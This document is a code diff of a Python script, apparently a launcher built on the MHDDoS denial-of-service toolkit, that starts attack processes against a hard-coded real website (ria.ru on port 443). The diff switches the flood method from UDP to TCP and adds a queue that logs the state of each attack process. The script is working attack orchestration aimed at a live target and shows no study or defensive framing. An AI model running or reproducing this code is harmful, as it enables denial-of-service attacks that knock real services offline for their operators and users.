@@ -1,16 +1,16 @@
 import logging
 import time
-from multiprocessing import Process
-from sys import argv
+from multiprocessing import Process, Queue
+from queue import Empty
 from typing import List
 
 import colorama
 import psutil
 from humanfriendly.terminal import *
 
-from MHDDoS.start import start, attack
+from MHDDoS.start import attack, AttackState
 from MHDDoS.utils.targets import Target
-from utils import print_vpn_warning, supports_complex_colors
+from utils.misc import print_vpn_warning, supports_complex_colors
 
 logger = logging.getLogger("PALYANYTSYA")
 
@@ -63,19 +63,29 @@ def velyka_kara():
 
     attack_processes: List[Process] = []
 
-    for _ in range(cpu_count):
+    state_queue = Queue()
+
+    for _ in range(1):
         target = Target.parse_from_string("https://ria.ru:443")
-        attack_method = "UDP"
+        attack_method = "TCP"
         attack_process = Process(
             target=attack,
             args=(target, attack_method),
             kwargs={
-                "proxies_file_path": None
+                "proxies_file_path": None,
+                "attack_state_queue": state_queue
             },
             daemon=True
         )
         attack_processes.append(attack_process)
         attack_process.start()
+
+    while True:
+        try:
+            state_update: AttackState = state_queue.get_nowait()
+            logger.warning(f" ------------------------> Received state update from PID{state_update.attack_pid}: {state_update}")
+        except Empty:
+            time.sleep(0.1)
 
     time.sleep(60)
     for attack_process in attack_processes:
